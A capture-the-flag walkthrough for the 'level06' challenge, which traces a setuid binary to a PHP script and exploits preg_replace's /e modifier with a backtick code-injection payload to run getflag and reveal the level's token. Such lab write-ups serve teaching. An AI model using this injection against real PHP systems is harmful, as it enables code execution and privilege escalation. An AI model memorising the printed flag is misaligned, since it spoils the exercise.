# level06

- We log as `level06`

- Two files are located inside the home directory of level06:
>`-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06`
>`-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php`

- The executable file has extended permissions:
```
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---
```

- We can see that the executable will be executed as `flag06` if we execute it being `level06`

- Upon execution without arguments the executable prints:
>`PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4`

- That error being a PHP error we try to run the php script with `php ./level06.php`:
>`PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5`
>`PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5`
>`PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4`

- We can see that one of the errors is the same, maybe the executable is running the script

- Upon execution with an argument with `./level06 test` the program prints:
>`PHP Warning:  file_get_contents(test): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4`

- When trying to execute the php script with `php ./level06 test` it prints:
>`PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5`
>`PHP Warning:  file_get_contents(test): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4`

- The similarity between those errors confirm that the executable runs the script.

- Let's take a look to the script:
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

- This script finds patterns inside a file passed as parameter and replace them using the `preg_replace` function

- The `preg_replace` function has a major security issue in versions of PHP older than 5.5.0 due to the `/e` allowing to evaluate the second parameter as PHP code:
>`preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`

- This line will look for a pattern `[x anything]` and will transform it into `anything`, this value being composed of any character and any length:
>`(\[x (.*)\])`

- The `anything` element is passed through the second parameter with `\\2` and then passed through the `y` function
>`y(\"\\2\")`

- This whole parameter being evaluated as PHP code thanks to `/e` we can inject code in the pattern to be run, in a file `/tmp/pwn`, we write
>`[x ${`\``getflag`\``}]`

- Upon evaluation, the getflag command will be executed thanks to ` ` ` (back quote):
>`PHP Notice:  Undefined variable: Check flag.Here is your token :`
>`wiok45aaoguiboiki2tuin6ub`
>`in /home/user/level06/level06.php(4) : regexp code on line 1`

- We get the flag: `wiok45aaoguiboiki2tuin6ub`

